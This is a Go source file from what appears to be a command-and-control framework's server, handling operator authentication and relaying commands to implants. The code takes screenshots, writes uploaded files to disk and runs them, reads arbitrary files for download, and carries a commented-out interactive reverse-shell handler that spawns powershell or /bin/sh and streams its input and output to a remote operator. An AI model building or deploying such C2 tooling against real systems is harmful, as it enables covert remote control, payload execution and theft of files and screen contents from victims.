package lib

import (
  //"io"
  "os"
  "net"
  "fmt"
  //"log"
  "sync"
  "time"
  //"bytes"
  "errors"
  "context"
  //"runtime"
  //"os/exec"
  "io/ioutil"
  "github.com/alphamystic/odin/lib/c2"
  "github.com/alphamystic/odin/lib/core"
  "github.com/alphamystic/odin/lib/utils"
  "google.golang.org/grpc"
  "github.com/alphamystic/odin/lib/penguins/zoo"

  "github.com/alphamystic/odin/wheagle/server/grpcapi"
)

/* @TODO Deprecate shell in,shell out into a tunnel */
type AdminData struct{
  Ad *c2.AdminC2
}

var NotAvailableImplant = errors.New("Client not present or inactive")
var ErrWorkWrittenIn = errors.New("work written in")


type AdminServer struct {
  ACave *core.Cave
  Config *MSRunner
  APillar *Pillar
  OS string
}


func NewAdminServer(cave *core.Cave,config *MSRunner,pillar *Pillar) *AdminServer{
  srv := &AdminServer{
    ACave: cave,
    Config:config,
    APillar: pillar,
    OS: utils.GetCurrentOS(),
  }
  return srv
}


func (srv *AdminServer) RunCommand(ctx context.Context,cmd *grpcapi.Command) (*grpcapi.Command,error){
  var res *grpcapi.Command
  var errChan = make(chan error)
  var wg sync.WaitGroup
  wg.Add(1)
  go func(){
    defer wg.Done()
    //active := srv.APillar.IsActive(cmd)
    if !srv.APillar.IsActive(cmd){
      errChan <- NotAvailableImplant
      //select{ case srv.Output <- cmd: case <- ctx.Done(): return      }
      return
    }
    work := &Jacuzzi{
      OperatorId: cmd.OperatorId,
      CmdIn: cmd.In,
      Done: false,
    }
    err := srv.APillar.AddWork(cmd.UserId,work)
    if err != nil{
      errChan <- err; return
    }
    time.Sleep(5 * time.Second)
    errChan <- ErrWorkWrittenIn
    //srv.Work <- cmd
  }()
  for{
    select{
    case err,ok := <- errChan:
      if !ok {}
      //close(errChan)
      if err != nil{
        if errors.Is(err, ErrWorkWrittenIn) {
          res,err = srv.APillar.GetWorkDone(cmd)
          if err != nil{
            utils.Logerror(err)
            return res,err
          }
          return res,nil
          //res = poolJacuzzi
          break
        }
        if errors.Is(err,NotAvailableImplant){
          return nil,err
        }
        utils.Logerror(err)
        return res,err
      }
    case <- ctx.Done():
      return res,ctx.Err()
    }
  }
  wg.Wait()
  //res = <-srv.Output
  //fmt.Println("OUtput recieved ",res.In)
  return res,nil
  //get the cmd in and get pool,if theres none return res else write cmd to work
  // point is if theres no work don,t write to the pool
}

//find a way to add operators
func (srv *AdminServer) RunOperatorAuthentication(ctx context.Context,auth *grpcapi.Auth) (*grpcapi.Auth,error){
  fmt.Println("Running authentication....")
  //var res grpcapi.Auth
  err := srv.Config.MSAuthenticate(auth.UserId)
  if err != nil{
    auth.Authenticated = false
    auth.MSId = fmt.Sprintf("%s",err)// this is bad and illegal but WTH
    return auth,err
  }
  fmt.Println("Successfully aauthenticated..............")
  auth.Authenticated = true
  auth.MSId = srv.Config.MSId
  return auth,nil
}

//@TODO Remeber to create TLS-TCP (Encrypted TCP connection)
func GetServer(protocol,address string,port int)(net.Listener,error){
  switch protocol {
  case "udp":
    return net.Listen("udp",fmt.Sprintf("%s:%d",address,port))
  case "http":
    return net.Listen("http",fmt.Sprintf("%s:%d",address,port))
  default:
    return net.Listen("tcp",fmt.Sprintf("%s:%d",address,port))
  }
  return nil,fmt.Errorf("You probably provided a bad protocol but it should have defaulted to TCP.\n BASICALLY THIS ISN'T GOOD.")
}


// should have made ths to be empty :)
func (srv *AdminServer) TakeAdminScreenShot(ctx context.Context, in *grpcapi.C2Command) (*grpcapi.Screenshots, error){
  var scrnshts []string
  screenshots := zoo.TakeScreenShot()
  for _,s := range screenshots.SCS{
    scrnshts = append(scrnshts,s.Screenshot)
  }
  //scts :=make([][]string)
  return &grpcapi.Screenshots{
    Screenshot: scrnshts,
  },nil
  //screenshots = screenshots.SCS
  //return &scrnshts,nil
}

func (srv *AdminServer) AdminSendFile(ctx context.Context, in *grpcapi.File) (*grpcapi.FileMessage, error){
  var fmsg = new(grpcapi.FileMessage); var pid int
  err := os.WriteFile(in.Name,in.Data,0666)
  if err != nil{
    return nil,fmt.Errorf("Error creating file.\n %q",err)
  }
  fmsg.Done = true
  if !in.Run{
    return fmsg,nil
  }
  if srv.OS == "windows"{
    if pid,err = utils.RunExecutable(`.\`+in.Name); err != nil{
      return fmsg,fmt.Errorf("Error running executable.\n%q",err)
    }
    fmsg.Pid = int32(pid)
    return fmsg,nil
  }
  if pid,err = utils.RunExecutable("./"+in.Name); err != nil{
    return fmsg,fmt.Errorf("Error runing executable. \n%q",err)
  }
  fmsg.Pid = int32(pid)
  return fmsg,nil
}

func (srv *AdminServer) AdminDownloadFile(ctx context.Context, in *grpcapi.FileMessage) (*grpcapi.File, error){
  var fl = new(grpcapi.File)
  data,err := ioutil.ReadFile(in.Directory)
  if err != nil{
    return nil,fmt.Errorf("Error opening file for reading.\n%q",err)
  }
  fl.Data = data
  fl.Name = in.Name
  return fl,nil
}

func (ac2 *AdminData) CreatePivotTunnel(adminImplant bool)error{
  return nil
}

func (ac2 *AdminData) GetTunnelingAddresses(admin bool)(string){
  if admin && len(ac2.Ad.AdminTunnel) > 0 {
    return ac2.Ad.AdminTunnel
  }
  if admin && len(ac2.Ad.AdminTunnel) < 0{
    err := ac2.CreatePivotTunnel(true)
    if err != nil{
      return fmt.Sprintf("%s",fmt.Errorf("Error creating admin tunnel: %v",err))
    }
    return ac2.Ad.AdminTunnel
  }
  if !admin && len(ac2.Ad.ImplantTunnel) > 0{
    return ac2.Ad.ImplantTunnel
  }
  if !admin && len(ac2.Ad.ImplantTunnel) < 0 {
    err := ac2.CreatePivotTunnel(false)
    if err != nil {
      return fmt.Sprintf("Error creating implant tunnel: \nERROR: %s",err)
    }
    return ac2.Ad.ImplantTunnel
  }
  return ""
}


// @TODO Remeber to give this parameters
func (ac2 *AdminData) RunMothershipGRPC(){
  var (
    implantListener,adminListener net.Listener
    err error
    opts []grpc.ServerOption
  )
  opts = append(opts,grpc.MaxRecvMsgSize(2 * 1024 * 1024 * 1024))
  cave := core.InitializeTunnelMan()
  pillar := InitializePillar()
  //Initialize a runner mode for your server (This should be ahandler to handle all connections)
  msr := SetRunningConfigurations(ac2.Ad.MSId,ac2.Ad.Password)
  implant := NewImplantServer(cave,msr,pillar)
  admin := NewAdminServer(cave,msr,pillar)
  if implantListener,err = GetServer(ac2.Ad.ImplantProtocol,ac2.Ad.Address,ac2.Ad.ImplantPort); err != nil{
    utils.Logerror(err)
    return
  }
  if adminListener,err = GetServer(ac2.Ad.OProtocol,ac2.Ad.Address,ac2.Ad.OPort); err != nil{
    utils.Logerror(err)
    return
  }
  grpcAdminServer,grpcImplantServer := grpc.NewServer(opts...),grpc.NewServer(opts...)
  grpcapi.RegisterAdminServer(grpcAdminServer,admin)
  grpcapi.RegisterImplantServer(grpcImplantServer,implant)
  // run your servers
  go func(){
    grpcImplantServer.Serve(implantListener)
  }()
  grpcAdminServer.Serve(adminListener)
}

/*
func (srv *AdminServer) RunInteractive(stream grpcapi.Admin_RunInteractiveServer) error{
  var cmd *exec.Cmd
  if runtime.GOOS == "windows"{
    cmd = exec.Command("powershell.exe")
  } else {
    cmd = exec.Command("/bin/sh","-i")
  }
  zoo.CommandExecuter(cmd)
  stdin,err := cmd.StdinPipe()
  if err != nil{ return err }
  stdout,err := cmd.StdoutPipe()
  if err != nil{ return err }
  if err := cmd.Start(); err != nil{
    return err
  }
  cmd.Run()
  var m sync.Mutex
  go func(){
    for {
      buf := bytes.Buffer{}
      _,err := stdout.Read(buf.Bytes())
      if err != nil{
        if err == io.EOF {
          continue
        }
        utils.Logerror(fmt.Errorf("Error reading from stdout: %v",err))
      }
      m.Lock()
      defer m.Unlock()
      if err := stream.Send(&grpcapi.ReverseShellResponse{Output:buf.Bytes()}); err != nil{
        utils.Logerror(fmt.Errorf("Error sending output to operator: %v",err))
      }
      fmt.Println("Sent some buffer")
    }
  }()
  for true {
    fmt.Println("Action...")
    time.Sleep(time.Second * 3)//wait for response
    req,err := stream.Recv()
    if err != nil{
      if err != io.EOF{
        return fmt.Errorf("Error reading from operator: \n ERROR: %v\n")
      }
      continue
    }
    m.Lock()
    defer m.Unlock()
    if _,err := stdin.Write(req.GetInput());err != nil{
      return err
    }
  }
  cmd.Wait()
  return nil
}
*/
